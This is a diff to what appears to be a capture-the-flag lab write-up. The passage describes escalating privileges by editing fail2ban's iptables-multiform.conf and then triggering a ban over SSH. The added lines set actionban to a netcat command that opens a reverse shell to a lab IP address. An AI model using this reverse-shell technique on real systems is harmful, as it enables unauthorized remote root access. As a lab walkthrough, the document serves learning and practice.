@@ -94,9 +94,15 @@ In /etc/fail2ban/jail.conf file I was able to find the bantime (1 minute), numer
 
 Knowing this I decided to modify /etc/fail2ban/action.d/iptables-multiform.conf which contains the `actionban` rule.
 This rule sets the action the server will take when a host is banned. 
+
 I modified this file to open a reverse shell when a host is banned:
 
+File permissions
 ![actionban](\assets\images\pg-practice-fail\18.JPG)
+
+```
+actionban = /usr/bin/nc -e /usr/bin/bash 192.168.45.240 5566
+```
 ![actionban2](\assets\images\pg-practice-fail\19.JPG)
 
 In order to catch the reverse shell I opened a netcat listener and tried to login via SSH to get banned.
